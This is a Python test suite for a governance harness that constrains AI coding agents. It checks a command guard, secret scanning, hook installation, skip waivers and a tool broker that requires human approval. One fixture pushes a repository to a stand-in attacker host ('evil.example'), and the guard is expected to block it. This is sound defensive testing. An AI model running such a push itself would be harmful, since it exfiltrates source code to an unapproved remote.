#!/usr/bin/env python3
from __future__ import annotations

import importlib.util
import json
import os
import re
import shutil
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path

HARNESS=Path(__file__).resolve().parents[2]
SHARED=HARNESS/'shared'
def load(path,name):
 spec=importlib.util.spec_from_file_location(name,path); m=importlib.util.module_from_spec(spec); sys.modules[name]=m; spec.loader.exec_module(m); return m
rem=load(SHARED/'remotes.py','remotes')
class HarnessTests(unittest.TestCase):
 def test_remote_golden_vectors(self):
  d=json.loads((SHARED/'remote-conformance.json').read_text()); allow=d['allowlist']
  for c in d['cases']:
   if 'error' in c:
    with self.assertRaises(rem.RemoteParseError): rem.normalize_remote_url(c['url'])
   else:
    self.assertEqual(rem.normalize_remote_url(c['url']).canonical,c['canonical']); self.assertEqual(rem.check_url(c['url'],allow)[0],c['allowed'])
 def test_shared_kernel_byte_identical(self):
  files=['remotes.py','pretooluse_guard.py','pretooluse_guard.sh','pre_push_scan.sh','install_hooks.sh','verify_zero_skips.py','check_projections.py','check_traceability.py','validate_agent_policy.py','validate_policy.py','validate_governance_docs.py','validate_adoption.py','validate_specs.sh']
  for f in files:
   expected=(SHARED/f).read_bytes()
   for stack in ('node','jvm'): self.assertEqual(expected,(HARNESS/stack/'scripts'/f).read_bytes(),f'{stack}/{f} drifted')
 def test_ci_calls_all_policy_targets(self):
  policy=json.loads((SHARED/'governance-policy.json').read_text())
  for stack in ('node','jvm'):
   ci=(HARNESS/stack/'.github/workflows/ci.yml').read_text(); mk=(HARNESS/stack/'Makefile').read_text()
   for g in policy['ci_required_targets']: self.assertIn(f'make {g}',ci,f'{stack} CI missing make {g}')
   self.assertNotIn('--json\n',re.search(r'(?ms)^remotes:.*?(?=^[A-Za-z_-]+:|\Z)',mk).group(0))
 def test_secret_scan_and_history_invariants(self):
  for stack in ('node','jvm'):
   mk=(HARNESS/stack/'Makefile').read_text(); ci=(HARNESS/stack/'.github/workflows/ci.yml').read_text()
   self.assertRegex(mk,r'\$\(GITLEAKS\) dir '); self.assertRegex(mk,r'\$\(GITLEAKS\) git ')
   self.assertIn('command -v $(GITLEAKS)',mk); self.assertIn('command -v $(OSV)',mk)
   self.assertIn('fetch-depth: 0',ci)
   self.assertNotRegex(mk,r'GITLEAKS_VERSION\s*\?=\s*(latest|main|master)\b')
 def test_hook_installer_uses_effective_path_and_refuses_foreign_overwrite(self):
  with tempfile.TemporaryDirectory() as td:
   r=Path(td); subprocess.run(['git','init','-q',str(r)],check=True); (r/'scripts').mkdir()
   for f in ('install_hooks.sh','pre_push_scan.sh'): shutil.copy(SHARED/f,r/'scripts'/f)
   subprocess.run(['git','-C',str(r),'config','core.hooksPath','.custom-hooks'],check=True)
   subprocess.run(['bash','scripts/install_hooks.sh'],cwd=r,check=True)
   hook=r/'.custom-hooks/pre-push'; self.assertTrue(hook.is_file()); self.assertIn('Agentic SSD governance dispatcher',hook.read_text())
   hook.write_text('#!/bin/sh\necho foreign\n'); hook.chmod(0o755)
   self.assertNotEqual(subprocess.run(['bash','scripts/install_hooks.sh'],cwd=r).returncode,0)
 def test_prepr_order(self):
  p=json.loads((SHARED/'governance-policy.json').read_text())
  for stack in ('node','jvm'):
   mk=(HARNESS/stack/'Makefile').read_text(); m=re.search(r'^pre-pr:\s*(.+?)\s*##',mk,re.M); self.assertIsNotNone(m); self.assertEqual(m.group(1).split(),p['pre_pr_order'])
 def test_no_security_placeholders(self):
  for f in ('remotes.py','pretooluse_guard.py','pre_push_scan.sh'):
   self.assertNotIn('{{',(SHARED/f).read_text())
 def test_ci_requires_strict_spec_validator(self):
  for stack in ('node','jvm'):
   ci=(HARNESS/stack/'.github/workflows/ci.yml').read_text()
   self.assertIn('REQUIRE_STRICT_SPEC_VALIDATOR=1 make specs',ci)
 def test_tsconfig_no_fake_comment_properties(self):
  s=(HARNESS/'node/tsconfig.json').read_text(); self.assertNotRegex(s,r'"//[^"\\]*"\s*:')
 def test_vitest4_coverage_config(self):
  s=(HARNESS/'node/vitest.config.ts').read_text(); self.assertNotRegex(s,r'\ball\s*:\s*true'); self.assertIn('include:',s)
 def test_jvm_locking_and_verification_fail_closed(self):
  b=(HARNESS/'jvm/build.gradle.kts').read_text(); mk=(HARNESS/'jvm/Makefile').read_text()
  self.assertIn('lockAllConfigurations()',b); self.assertIn('LockMode.STRICT',b)
  self.assertNotIn('--write-verification-metadata sha256 help --dry-run >/dev/null || true',mk)
  self.assertIn('verification-metadata.xml',mk)
  self.assertIn('dependsOn(tasks.test)',b); self.assertNotIn('finalizedBy(verifyNoSkippedTests)',b)
  self.assertIn('tasks.named("check") { dependsOn(verifyNoSkippedTests) }',b)
 def test_junit_listener_does_not_claim_throw_fails(self):
  s=(HARNESS/'jvm/src/test/kotlin/governance/ZeroSkipListener.kt').read_text(); self.assertNotIn('throw AssertionError',s); self.assertIn('runtime-skips.tsv',s)
 def test_guard_probe_propagates_block_status(self):
  for stack in ('node','jvm'):
   mk=(HARNESS/stack/'Makefile').read_text()
   block=re.search(r'(?ms)^guard-probe:.*?(?=^[A-Za-z_-]+:|\Z)',mk)
   self.assertIsNotNone(block)
   self.assertIn("verdict: BLOCK'; exit 2",block.group(0),f'{stack} guard-probe must propagate BLOCK status')
 def test_guard_fail_closed_and_allows_safe(self):
  with tempfile.TemporaryDirectory() as td:
   r=Path(td); subprocess.run(['git','init','-q',str(r)],check=True); (r/'scripts').mkdir(); (r/'.governance').mkdir()
   for f in ('pretooluse_guard.py','remotes.py'): shutil.copy(SHARED/f,r/'scripts'/f)
   (r/'.governance/allowed-remotes.txt').write_text('github.com/ExampleOrg/*\n')
   subprocess.run(['git','-C',str(r),'remote','add','origin','git@github.com:ExampleOrg/Repo.git'],check=True)
   env={**os.environ,'CLAUDE_PROJECT_DIR':str(r)}
   safe=subprocess.run([sys.executable,str(r/'scripts/pretooluse_guard.py')],input=json.dumps({'tool_input':{'command':'git status'}}),text=True,env=env); self.assertEqual(safe.returncode,0)
   ok=subprocess.run([sys.executable,str(r/'scripts/pretooluse_guard.py')],input=json.dumps({'tool_input':{'command':'git push origin main'}}),text=True,env=env); self.assertEqual(ok.returncode,0)
   bad=subprocess.run([sys.executable,str(r/'scripts/pretooluse_guard.py')],input=json.dumps({'tool_input':{'command':'git push https://evil.example/Org/Repo main'}}),text=True,env=env); self.assertEqual(bad.returncode,2)
   malformed=subprocess.run([sys.executable,str(r/'scripts/pretooluse_guard.py')],input='not json git push evil',text=True,env=env); self.assertEqual(malformed.returncode,2)
 def test_zero_skip_exact_decision_backed_waivers(self):
  with tempfile.TemporaryDirectory() as td:
   r=Path(td); (r/'.governance').mkdir()
   (r/'.governance/decision-log.md').write_text('# Decisions\n\n## DEC-123 — approved temporary skip\n', encoding='utf-8')
   future='2099-12-31'
   vfile='tests/example.test.ts'; vname='suite > individual skip'
   uid='[engine:junit-jupiter]/[class:ExampleTest]/[method:individual()]'; jname='individual()'
   registry={'version':2,'waivers':[
    {'framework':'vitest','file':vfile,'test':vname,'decision_id':'DEC-123','reason':'fixture','owner':'qa','expires':future},
    {'framework':'junit','unique_id':uid,'test':jname,'decision_id':'DEC-123','reason':'fixture','owner':'qa','expires':future},
   ]}
   (r/'.governance/skip-waivers.json').write_text(json.dumps(registry), encoding='utf-8')
   vitest={'testResults':[{'name':'/tmp/project/'+vfile,'assertionResults':[{'status':'pending','ancestorTitles':['suite'],'title':'individual skip'}]}]}
   (r/'vitest.json').write_text(json.dumps(vitest), encoding='utf-8')
   (r/'junit.tsv').write_text(f'{uid}\t{jname}\tDEC-123 approved\n', encoding='utf-8')
   base=[sys.executable,str(SHARED/'verify_zero_skips.py'),'--decision-log',str(r/'.governance/decision-log.md'),'--waivers',str(r/'.governance/skip-waivers.json')]
   self.assertEqual(subprocess.run([*base,'--vitest-json',str(r/'vitest.json')]).returncode,0)
   self.assertEqual(subprocess.run([*base,'--junit-events',str(r/'junit.tsv')]).returncode,0)
   (r/'junit.tsv').write_text(f'{uid}\t{jname}\tDEC-999 fabricated\n', encoding='utf-8')
   self.assertNotEqual(subprocess.run([*base,'--junit-events',str(r/'junit.tsv')]).returncode,0)
 def test_agent_role_contracts_and_policy_identity(self):
  roles=('orchestrator','spec-analyst','implementer','test-eval','security-reviewer','peer-reviewer','release-auditor')
  expected=(SHARED/'agent-policy.json').read_bytes()
  for stack in ('node','jvm'):
   self.assertEqual(expected,(HARNESS/stack/'.governance/agent-policy.json').read_bytes())
   for role in roles: self.assertTrue((HARNESS/stack/'agents'/f'{role}.md').is_file(),f'{stack} missing {role}')
 def test_external_root_of_trust_verifies_protected_digests(self):
  with tempfile.TemporaryDirectory() as td:
   r=Path(td)/'node'; shutil.copytree(HARNESS/'node',r,ignore=shutil.ignore_patterns('node_modules','.git'))
   bundle=json.loads((HARNESS/'control-plane/policy-bundle.example.json').read_text())
   (r/'.governance/root-of-trust.json').write_text(json.dumps({'external_policy_ref':'org/governance@pinned','policy_sha256':bundle['governance_policy_sha256']}))
   verifier=str(HARNESS/'control-plane/verify_repository.py'); b=str(HARNESS/'control-plane/policy-bundle.example.json')
   self.assertEqual(subprocess.run([sys.executable,verifier,'--repo',str(r),'--bundle',b]).returncode,0)
   (r/'Makefile').write_text('governance:\n\t@true\n')
   self.assertNotEqual(subprocess.run([sys.executable,verifier,'--repo',str(r),'--bundle',b]).returncode,0)
 def test_tool_broker_requires_action_specific_human_approval(self):
  policy=str(SHARED/'agent-policy.json'); broker=str(HARNESS/'control-plane/tool_broker_reference.py')
  denied=subprocess.run([sys.executable,broker,'--policy',policy,'--agent','release-auditor','--action','external_write'])
  allowed=subprocess.run([sys.executable,broker,'--policy',policy,'--agent','release-auditor','--action','external_write','--human-approved'])
  read=subprocess.run([sys.executable,broker,'--policy',policy,'--agent','release-auditor','--action','read'])
  self.assertNotEqual(denied.returncode,0); self.assertEqual(allowed.returncode,0); self.assertEqual(read.returncode,0)
 def test_agent_policy_files(self):
  for stack in ('node','jvm'):
   d=json.loads((HARNESS/stack/'.governance/agent-policy.json').read_text()); self.assertEqual(len(d['agents']),7)
if __name__=='__main__': unittest.main(verbosity=2)
